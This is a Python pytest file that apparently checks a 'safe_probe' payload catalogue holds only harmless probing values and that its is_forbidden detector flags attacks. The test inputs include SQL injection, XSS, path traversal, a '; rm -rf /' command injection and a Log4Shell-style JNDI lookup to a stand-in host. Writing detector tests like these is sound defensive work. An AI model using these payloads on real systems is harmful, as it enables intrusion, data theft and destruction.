from __future__ import annotations

import pytest

from safe_probe import payloads

# The catalogue is an invariant: only safe probing values, never an attack. If
# someone adds a destructive payload, one of these tests must fail.


def test_catalogue_contains_no_forbidden_patterns() -> None:
    offenders = {
        pid: payloads.is_forbidden(value)
        for pid, value in payloads.PAYLOADS.items()
        if payloads.is_forbidden(value) is not None
    }
    assert offenders == {}, f"forbidden patterns leaked into catalogue: {offenders}"


@pytest.mark.parametrize(
    "attack",
    [
        "1 OR 1=1",
        "' UNION SELECT password FROM users --",
        "<script>alert(1)</script>",
        "../../etc/passwd",
        "; rm -rf /",
        "${jndi:ldap://evil}",
        "javascript:alert(1)",
    ],
)
def test_is_forbidden_catches_attacks(attack: str) -> None:
    assert payloads.is_forbidden(attack) is not None


def test_get_returns_safe_value() -> None:
    assert payloads.get("empty-string") == ""
    assert payloads.get("wrong-type-int") == 12345


def test_get_unknown_id_raises() -> None:
    with pytest.raises(KeyError):
        payloads.get("does-not-exist")


def test_ids_are_sorted_and_nonempty() -> None:
    ids = payloads.ids()
    assert ids == sorted(ids)
    assert ids
